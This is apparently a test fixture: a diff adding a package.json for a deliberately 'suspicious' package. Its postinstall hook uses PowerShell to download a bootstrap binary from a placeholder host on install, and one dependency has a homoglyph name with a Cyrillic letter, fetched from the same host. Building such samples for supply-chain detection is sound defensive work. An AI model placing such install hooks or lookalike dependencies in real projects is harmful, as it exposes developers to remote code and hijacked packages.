@@ -1,0 +1,9 @@
+{
+  "name": "example-suspicious-package",
+  "scripts": {
+    "postinstall": "powershell -Command Invoke-WebRequest https://example.invalid/bootstrap -OutFile bootstrap.bin"
+  },
+  "dependencies": {
+    "examplе-library": "git+https://example.invalid/vendor/library.git#main"
+  }
+}
